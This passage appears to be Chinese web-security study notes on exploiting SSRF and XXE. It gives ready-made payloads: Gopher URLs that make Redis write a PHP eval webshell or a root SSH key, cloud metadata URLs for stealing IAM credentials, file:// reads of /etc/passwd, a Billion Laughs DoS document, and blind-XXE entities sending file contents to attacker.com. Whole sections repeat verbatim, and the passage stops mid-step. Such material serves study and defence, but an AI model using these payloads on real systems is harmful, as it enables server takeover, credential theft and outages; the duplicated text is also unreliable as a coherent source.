<li><strong>攻击内网服务：</strong> 利用 SSRF 访问内网中的 Redis、MySQL、Elasticsearch、Memcached 等服务。例如，利用 <strong>Gopher 协议</strong> 攻击 Redis 服务器，可以写入 Webshell 或者 SSH key，从而获得服务器的控制权<ul>
<li><strong>示例：</strong> <code>gopher://127.0.0.1:6379/_*2%0D%0A$4%0D%0Ainfo%0D%0A</code> 这个 payload 可以向本地的 Redis 服务发送 <code>info</code> 命令，获取 Redis 信息</li>
</ul>
</li>
<li><strong>利用 <code>file://</code> 协议：</strong> 如果没有协议限制，可以直接读取服务器本地文件，如 <code>/etc/passwd</code>、<code>/etc/hosts</code>、<code>.bash_history</code> 等，从而获取敏感信息<ul>
<li><strong>示例：</strong> <code>file:///etc/passwd</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>3. 攻击本地文件包含（LFI）</strong></p>
<p>在某些场景下，SSRF 可以与文件包含漏洞结合利用。例如，当目标网站的 URL 处理逻辑是 <code>file=http://example.com/a.txt</code> 时，你可以将 <code>http</code> 替换为 <code>file</code>，从而实现本地文件读取</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><code>http://target.com/?url=file:///etc/passwd</code></li>
</ul>
</li>
</ul>
<p><strong>4. 绕过防火墙</strong></p>
<p>许多 Web 应用服务器会部署在防火墙后面，防火墙通常只允许特定的出站请求。SSRF 漏洞可以利用服务器作为跳板，绕过防火墙的限制，直接攻击内网</p>
<p><strong>5. 探测云服务元数据</strong></p>
<p>在云服务环境（如 AWS, Google Cloud, Aliyun）中，服务器通常有一个特殊的元数据地址，例如 <strong><code>http://169.254.169.254/</code></strong>。这个地址只在虚拟机内部可访问，其中包含了非常敏感的信息，比如 <strong>IAM 角色凭证、密钥、实例信息</strong>等</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</code></li>
<li>通过 SSRF 漏洞访问这个地址，攻击者可以获取临时密钥，利用这些密钥就能以该角色的权限访问云服务，比如操作 S3 存储桶、启动或停止虚拟机等，造成巨大的安全风险</li>
</ul>
</li>
</ul>
<p><strong>6. DoS 攻击</strong></p>
<p>攻击者可以利用 SSRF 漏洞让服务器向自身或内网中的关键服务发起大量的请求，从而造成拒绝服务</p>
<ul>
<li><p><strong>利用方式：</strong></p>
<ul>
<li><code>http://localhost:80</code></li>
<li>通过循环请求 <code>http://localhost/</code>，可以耗尽服务器资源，使其无法正常提供服务</li>
</ul>
<hr>
<h3 id="SSRF-漏洞利用方式-1"><a href="#SSRF-漏洞利用方式-1" class="headerlink" title="SSRF 漏洞利用方式"></a>SSRF 漏洞利用方式</h3></li>
</ul>
<p><strong>1. 端口扫描</strong></p>
<p>这是最基础也最常见的利用方式。通过控制服务器向内网 IP 的不同端口发起请求，并根据响应时间、响应内容或 HTTP 状态码来判断端口是否开放</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><strong>GET 请求：</strong> <code>http://192.168.1.1:22</code></li>
<li><strong>响应判断：</strong> 如果端口开放，通常会有 HTTP 响应；如果端口关闭或服务不存在，请求会超时或返回连接失败。通过脚本自动化这个过程，可以快速绘制出内网的端口图</li>
</ul>
</li>
</ul>
<p><strong>2. 访问内网应用</strong></p>
<p>如果服务器能够访问内网，攻击者就可以通过SSRF漏洞来探测和攻击那些通常无法从外部网络访问的应用</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><strong>访问管理后台：</strong> 很多公司的内部管理系统、OA、数据库管理工具等都在内网运行。攻击者可以通过SSRF 漏洞直接访问这些后台，如果存在弱口令，就可能直接接管系统</li>
<li><strong>攻击内网服务：</strong> 利用 SSRF 访问内网中的 Redis、MySQL、Elasticsearch、Memcached 等服务。例如，利用 <strong>Gopher 协议</strong> 攻击 Redis 服务器，可以写入 Webshell 或者 SSH key，从而获得服务器的控制权<ul>
<li><strong>示例：</strong> <code>gopher://127.0.0.1:6379/_*2%0D%0A$4%0D%0Ainfo%0D%0A</code> 这个 payload 可以向本地的 Redis 服务发送 <code>info</code> 命令，获取 Redis 信息</li>
</ul>
</li>
<li><strong>利用 <code>file://</code> 协议：</strong> 如果没有协议限制，可以直接读取服务器本地文件，如 <code>/etc/passwd</code>、<code>/etc/hosts</code>、<code>.bash_history</code> 等，从而获取敏感信息<ul>
<li><strong>示例：</strong> <code>file:///etc/passwd</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>3. 攻击本地文件包含（LFI）</strong></p>
<p>在某些场景下，SSRF 可以与文件包含漏洞结合利用。例如，当目标网站的 URL 处理逻辑是 <code>file=http://example.com/a.txt</code> 时，你可以将 <code>http</code> 替换为 <code>file</code>，从而实现本地文件读取</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><code>http://target.com/?url=file:///etc/passwd</code></li>
</ul>
</li>
</ul>
<p><strong>4. 绕过防火墙</strong></p>
<p>许多 Web 应用服务器会部署在防火墙后面，防火墙通常只允许特定的出站请求。SSRF 漏洞可以利用服务器作为跳板，绕过防火墙的限制，直接攻击内网</p>
<p><strong>5. 探测云服务元数据</strong></p>
<p>在云服务环境（如 AWS, Google Cloud, Aliyun）中，服务器通常有一个特殊的元数据地址，例如 <strong><code>http://169.254.169.254/</code></strong>。这个地址只在虚拟机内部可访问，其中包含了非常敏感的信息，比如 <strong>IAM 角色凭证、密钥、实例信息</strong>等</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</code></li>
<li>通过 SSRF 漏洞访问这个地址，攻击者可以获取临时密钥，利用这些密钥就能以该角色的权限访问云服务，比如操作 S3 存储桶、启动或停止虚拟机等，造成巨大的安全风险</li>
</ul>
</li>
</ul>
<p><strong>6. DoS 攻击</strong></p>
<p>攻击者可以利用 SSRF 漏洞让服务器向自身或内网中的关键服务发起大量的请求，从而造成拒绝服务</p>
<ul>
<li><p><strong>利用方式：</strong></p>
<ul>
<li><code>http://localhost:80</code></li>
<li>通过循环请求 <code>http://localhost/</code>，可以耗尽服务器资源，使其无法正常提供服务</li>
</ul>
<hr>
<h3 id="SSRF-如何攻击内网服务"><a href="#SSRF-如何攻击内网服务" class="headerlink" title="SSRF 如何攻击内网服务"></a>SSRF 如何攻击内网服务</h3></li>
</ul>
<p><strong>1. 判断内网Redis端口是否开放</strong></p>
<p>首先，我们需要确认目标服务器的内网中是否存在 Redis 服务，以及它监听的端口。Redis 的默认端口是 <strong>6379</strong></p>
<p>我们可以使用 SSRF 漏洞，尝试向 <code>http://127.0.0.1:6379/</code> 发起请求。如果请求有响应或返回连接成功的提示，那么Redis 服务可能存在</p>
<p><strong>2. 构造Redis命令</strong></p>
<p>Redis的通信协议（RESP，Redis Serialization Protocol）是一种基于TCP的文本协议。攻击者需要将Redis命令转换为符合该协议的格式</p>
<p>例如，一个简单的<code>INFO</code>命令的RESP格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">INFO</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>\*1</code></strong>：表示这是一个包含 1 个命令参数的数组</li>
<li><strong><code>$4</code></strong>：表示接下来的参数有 4 个字节</li>
<li><strong><code>INFO</code></strong>：参数的具体内容</li>
</ul>
<p>在 Gopher 协议中，换行符需要转换为 URL 编码，即<code>%0D%0A</code>（回车换行）。因此，上述命令转换为 Gopher 协议的 URL编码后是： <code>gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A</code></p>
<p><strong>3. 写入WebShell</strong></p>
<p>这是最常见的攻击方式，尤其是在目标服务器是 Web 服务器的情况下。攻击者可以利用 Redis 的持久化功能，将WebShell 代码写入到服务器的网站根目录，从而获得服务器的控制权</p>
<p><strong>攻击思路：</strong></p>
<ol>
<li><strong>设置 Redis 的 <code>dir</code> 和 <code>dbfilename</code></strong>：将 Redis 的持久化目录设置为网站根目录，将持久化文件名设置为一个WebShell 文件名（如 <code>shell.php</code>）。</li>
<li><strong>写入 WebShell 代码</strong>：利用 Redis 的 <code>SET</code> 命令，将 WebShell 代码写入一个键中</li>
<li><strong>执行 <code>SAVE</code> 或 <code>BGSAVE</code></strong>：执行 <code>SAVE</code> 命令将数据保存到指定的 WebShell 文件中</li>
</ol>
<p><strong>Gopher Payload 构造举例（以写入PHP一句话木马为例）：</strong></p>
<p><strong>PHP 一句话木马代码：</strong> <code>&lt;?php eval($_POST[cmd]);?&gt;</code></p>
<ol>
<li><strong>设置文件目录</strong>：<code>config set dir /var/www/html/</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$14%0D%0A/var/www/html/%0D%0A</code></li>
<li><strong>设置文件名</strong>：<code>config set dbfilename shell.php</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A</code></li>
<li><strong>设置键值</strong>：<code>set 1 &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$27%0D%0A%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%3f%3e%0D%0A</code></li>
<li><strong>执行保存</strong>：<code>save</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0Asave%0D%0A</code></li>
</ol>
<p>你可以将上述 Payload 组合起来，并进行 URL 编码，通过 SSRF 漏洞一次性发送</p>
<p><strong>4. 写入 SSH 公钥</strong></p>
<p>如果 Redis 服务是以 root 权限运行，并且目标服务器开放了 SSH 服务，攻击者还可以通过 Redis 将 SSH 公钥写入 root 用户的 <code>.ssh/authorized_keys</code> 文件，从而实现 SSH 免密登录</p>
<p><strong>Gopher Payload 构造举例：</strong></p>
<ol>
<li>设置文件目录：<code>config set dir /root/.ssh/</code></li>
<li>设置文件名：<code>config set dbfilename authorized_keys</code></li>
<li>写入SSH公钥：<code>set 1 &#39;ssh-rsa AAAA...your-pubkey...&#39;</code></li>
<li>执行保存：<code>save</code></li>
</ol>
<hr>
<h3 id="SSRF-如何攻击内网服务-1"><a href="#SSRF-如何攻击内网服务-1" class="headerlink" title="SSRF 如何攻击内网服务"></a>SSRF 如何攻击内网服务</h3><p><strong>1. 判断内网Redis端口是否开放</strong></p>
<p>首先，我们需要确认目标服务器的内网中是否存在 Redis 服务，以及它监听的端口。Redis 的默认端口是 <strong>6379</strong></p>
<p>我们可以使用 SSRF 漏洞，尝试向 <code>http://127.0.0.1:6379/</code> 发起请求。如果请求有响应或返回连接成功的提示，那么Redis 服务可能存在</p>
<p><strong>2. 构造Redis命令</strong></p>
<p>Redis的通信协议（RESP，Redis Serialization Protocol）是一种基于TCP的文本协议。攻击者需要将Redis命令转换为符合该协议的格式</p>
<p>例如，一个简单的<code>INFO</code>命令的RESP格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">INFO</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>\*1</code></strong>：表示这是一个包含 1 个命令参数的数组</li>
<li><strong><code>$4</code></strong>：表示接下来的参数有 4 个字节</li>
<li><strong><code>INFO</code></strong>：参数的具体内容</li>
</ul>
<p>在 Gopher 协议中，换行符需要转换为 URL 编码，即<code>%0D%0A</code>（回车换行）。因此，上述命令转换为 Gopher 协议的 URL编码后是： <code>gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A</code></p>
<p><strong>3. 写入WebShell</strong></p>
<p>这是最常见的攻击方式，尤其是在目标服务器是 Web 服务器的情况下。攻击者可以利用 Redis 的持久化功能，将WebShell 代码写入到服务器的网站根目录，从而获得服务器的控制权</p>
<p><strong>攻击思路：</strong></p>
<ol>
<li><strong>设置 Redis 的 <code>dir</code> 和 <code>dbfilename</code></strong>：将 Redis 的持久化目录设置为网站根目录，将持久化文件名设置为一个WebShell 文件名（如 <code>shell.php</code>）。</li>
<li><strong>写入 WebShell 代码</strong>：利用 Redis 的 <code>SET</code> 命令，将 WebShell 代码写入一个键中</li>
<li><strong>执行 <code>SAVE</code> 或 <code>BGSAVE</code></strong>：执行 <code>SAVE</code> 命令将数据保存到指定的 WebShell 文件中</li>
</ol>
<p><strong>Gopher Payload 构造举例（以写入PHP一句话木马为例）：</strong></p>
<p><strong>PHP 一句话木马代码：</strong> <code>&lt;?php eval($_POST[cmd]);?&gt;</code></p>
<ol>
<li><strong>设置文件目录</strong>：<code>config set dir /var/www/html/</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$14%0D%0A/var/www/html/%0D%0A</code></li>
<li><strong>设置文件名</strong>：<code>config set dbfilename shell.php</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A</code></li>
<li><strong>设置键值</strong>：<code>set 1 &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$27%0D%0A%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%3f%3e%0D%0A</code></li>
<li><strong>执行保存</strong>：<code>save</code> <strong>Gopher Payload:</strong> <code>gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0Asave%0D%0A</code></li>
</ol>
<p>你可以将上述 Payload 组合起来，并进行 URL 编码，通过 SSRF 漏洞一次性发送</p>
<p><strong>4. 写入 SSH 公钥</strong></p>
<p>如果 Redis 服务是以 root 权限运行，并且目标服务器开放了 SSH 服务，攻击者还可以通过 Redis 将 SSH 公钥写入 root 用户的 <code>.ssh/authorized_keys</code> 文件，从而实现 SSH 免密登录</p>
<p><strong>Gopher Payload 构造举例：</strong></p>
<ol>
<li>设置文件目录：<code>config set dir /root/.ssh/</code></li>
<li>设置文件名：<code>config set dbfilename authorized_keys</code></li>
<li>写入SSH公钥：<code>set 1 &#39;ssh-rsa AAAA...your-pubkey...&#39;</code></li>
<li>执行保存：<code>save</code></li>
</ol>
<hr>
<h3 id="SSRF-怎么用-Redis-写-Shell"><a href="#SSRF-怎么用-Redis-写-Shell" class="headerlink" title="SSRF 怎么用 Redis 写 Shell"></a>SSRF 怎么用 Redis 写 Shell</h3><p><strong>步骤一：利用 SSRF 伪造 Redis 协议请求</strong></p>
<p>SSRF 攻击需要将恶意请求发送给目标服务器的 Redis 服务。这里通常需要使用 <strong>Gopher 协议</strong>。Gopher 协议可以发送自定义的 TCP 请求，这正是我们与 Redis 交互所需要的</p>
<p>Redis 的通信协议（RESP）是一个基于文本的协议。我们可以使用 Gopher 协议将这些命令编码成 URL 格式</p>
<p><strong>Redis 命令序列：</strong></p>
<p>我们通过 SSRF 漏洞向 Redis 服务器依次发送以下命令：</p>
<ol>
<li><code>SET webshell &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>：设置一个键名为 <code>webshell</code>，值为我们想要写入的 Webshell 代码</li>
<li><code>CONFIG SET dir &quot;/var/www/html/&quot;</code>：设置 Redis 的工作目录为网站的根目录</li>
<li><code>CONFIG SET dbfilename &quot;shell.php&quot;</code>：设置持久化文件名为 <code>shell.php</code></li>
<li><code>SAVE</code>：执行保存命令，将数据持久化到指定的文件中</li>
</ol>
<p><strong>步骤二：将命令编码为 Gopher 协议 URL</strong></p>
<p>我们需要将上述 Redis 命令序列转换成 Gopher URL</p>
<ul>
<li><p><strong>将命令转换为 RESP 协议格式</strong>：</p>
<ul>
<li><code>SET webshell &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>  -&gt; <code>*3\r\n$3\r\nSET\r\n$7\r\nwebshell\r\n$25\r\n&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;\r\n</code></li>
<li><code>CONFIG SET dir &quot;/var/www/html/&quot;</code> -&gt; <code>*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/www/html/\r\n</code></li>
<li><code>CONFIG SET dbfilename &quot;shell.php&quot;</code> -&gt; <code>*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n</code></li>
<li><code>SAVE</code> -&gt; <code>*1\r\n$4\r\nSAVE\r\n</code></li>
</ul>
<p><em>注：<code>\r\n</code> 是回车换行符，在 URL 中需要编码为 <code>%0d%0a</code></em></p>
</li>
<li><p><strong>拼接成完整的 Gopher URL</strong>： <code>gopher://127.0.0.1:6379/_</code> + <code>[RESP 编码的命令]</code> + <code>%0d%0a</code> + <code>[RESP 编码的命令]</code> + …</p>
<p>一个完整的 Gopher URL 示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$7%0d%0awebshell%0d%0a$25%0d%0a%3c%3fphp%20eval%28%24_POST%5b%27cmd%27%5d%29%3b%3f%3e%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>步骤三：通过 SSRF 漏洞发起请求</strong></p>
<p>将上述构造好的 URL 作为 SSRF 漏洞的参数值，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=gopher://127.0.0.1:6379/_...</span><br></pre></td></tr></table></figure>

<p>当服务器端执行这个请求时，它会通过 Gopher 协议向本地的 Redis 服务发送一系列命令，最终在 <code>/var/www/html/</code> 目录下生成一个名为 <code>shell.php</code> 的文件，其内容就是我们的 Webshell</p>
<p><strong>步骤四：访问 Webshell</strong></p>
<p>攻击者现在可以直接访问 <code>http://example.com/shell.php</code>，并通过 <code>cmd</code> 参数执行任意命令，从而完全控制服务器</p>
<h1 id="12-XXE-系列"><a href="#12-XXE-系列" class="headerlink" title="12- XXE 系列"></a>12- XXE 系列</h1><h3 id="XXE-漏洞利用方式"><a href="#XXE-漏洞利用方式" class="headerlink" title="XXE 漏洞利用方式"></a>XXE 漏洞利用方式</h3><p><strong>1. 文件读取（最常见）</strong></p>
<p>这是 XXE 漏洞最经典的利用方式，攻击者可以利用外部实体来读取服务器上的任意文件，例如<code>/etc/passwd</code>、Web 应用配置文件等</p>
<ul>
<li><p><strong>利用原理</strong>：攻击者在 XML 文档中定义一个外部实体，实体的值为一个本地文件路径。当 XML 解析器解析该实体时，就会去读取并返回该文件的内容</p>
</li>
<li><p><strong>利用步骤</strong>：</p>
<ol>
<li><strong>构造恶意 DTD</strong>：攻击者在 XML 文档的 DOCTYPE 声明中定义一个外部实体，通常使用 <code>SYSTEM</code> 关键字。<ul>
<li>例如：<code>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code></li>
</ul>
</li>
<li><strong>引用实体</strong>：在 XML 文档的主体中引用该实体。<ul>
<li>例如：<code>&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>完整示例</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当服务器解析这个 XML 时，在 <code>&lt;data&gt;</code> 标签中就会回显 <code>/etc/passwd</code> 文件的内容</p>
</li>
</ul>
<p><strong>2. 拒绝服务攻击（DoS）</strong></p>
<p>攻击者可以利用 XXE 漏洞，通过“递归引用”或“大量实体引用”的方式，使 XML 解析器进入死循环或消耗大量系统资源，从而导致服务崩溃</p>
<ul>
<li><p><strong>利用原理</strong>：利用 XML 实体可以相互引用的特性，构造一个无限递归或指数级爆炸的实体</p>
</li>
<li><p><strong>经典示例</strong>：<strong>十亿笑脸攻击（Billion Laughs Attack）</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个 XML 文件虽然很小，但在解析时，<code>&lt;lolz&gt;</code> 实体会扩展为数十亿个“lol”，消耗巨大的内存和 CPU 资源，最终导致服务器崩溃</p>
</li>
</ul>
<p><strong>3. 内网端口扫描</strong></p>
<p>攻击者可以利用 XXE 漏洞探测服务器所在内网中其他主机的开放端口</p>
<ul>
<li><strong>利用原理</strong>：攻击者构造外部实体，让 XML 解析器去尝试连接内网 IP 和端口。如果端口开放，XML 解析会成功或返回特定的错误信息；如果端口关闭，则会返回连接超时等错误，通过错误信息来判断端口状态</li>
<li><strong>利用方式</strong>：<ol>
<li><strong>定义外部实体</strong>：<code>&lt;!ENTITY scan SYSTEM &quot;http://192.168.1.1:80&quot;&gt;</code></li>
<li><strong>发送请求</strong>：让服务器去访问内网 IP 的端口</li>
<li><strong>观察响应</strong>：如果服务器返回了“连接被拒绝”等信息，说明端口是关闭的。如果返回了“连接超时”或成功连接，则说明端口可能是开放的</li>
</ol>
</li>
</ul>
<p><strong>4. 盲 XXE（Blind XXE）</strong></p>
<p>如果服务器没有将 XML 解析结果回显到前端，攻击者就无法直接看到文件内容，这时就需要利用<strong>带外（Out-of-Band）通信</strong>来获取信息</p>
<ul>
<li><strong>利用原理</strong>：攻击者利用外部实体向自己的服务器发送请求，并在 URL 中携带需要读取的文件内容</li>
<li><strong>利用步骤</strong>：<ol>
<li><p><strong>构造外部实体</strong>：攻击者在自己的服务器上搭建一个 HTTP 服务来监听请求</p>
<ul>
<li>例如：<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></li>
<li><code>&lt;!ENTITY % exfiltrate &quot;&lt;!ENTITY % send SYSTEM &#39;http://attacker.com/?data=%file;&#39;&gt;&quot;&gt;</code></li>
</ul>
</li>
<li><p><strong>远程引用</strong>：在主 XML 中引用攻击者的 DTD 文件</p>
<ul>
<li><code>&lt;!DOCTYPE foo SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</code></li>
<li>当服务器解析这个 DTD 时，就会将 <code>/etc/passwd</code> 文件的内容发送到攻击者的服务器上</li>
</ul>
<hr>
</li>
</ol>
</li>
</ul>
<h3 id="XXE-盲注思路"><a href="#XXE-盲注思路" class="headerlink" title="XXE 盲注思路"></a>XXE 盲注思路</h3><p><strong>1. 基础的带外请求（OOB）</strong></p>
<p>这是 XXE 盲注最基本的利用方式。我们首先要确认服务器是否存在 XXE 漏洞，即使没有回显</p>
<ul>
<li><p><strong>攻击步骤：</strong></p>
<ol>
<li><p><strong>准备攻击服务器：</strong> 搭建一个 Web 服务器（例如使用 Python 的 <code>SimpleHTTPServer</code>）或利用<strong>DNSlog</strong>平台</p>
</li>
<li><p><strong>构造恶意 XML 实体：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-evil-server.com/test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>发送请求：</strong> 将上述 XML 作为请求体发送到目标服务器</p>
</li>
<li><p><strong>确认存在漏洞：</strong> 如果你的服务器收到了来自目标 IP 的 <code>GET /test</code> 请求，就说明服务器存在 XXE 漏洞</p>
</li>
</ol>
</li>
</ul>
<p><strong>2. 利用带外请求获取文件内容</strong></p>
<p>确认漏洞存在后，下一步就是尝试读取服务器上的文件</p>
<ul>
<li><p><strong>攻击步骤：</strong></p>
<ol>
<li><p><strong>构造恶意 DTD 文件：</strong> 在你的攻击服务器上，创建一个 DTD 文件（例如 <code>evil.dtd</code>），内容如下：</p>
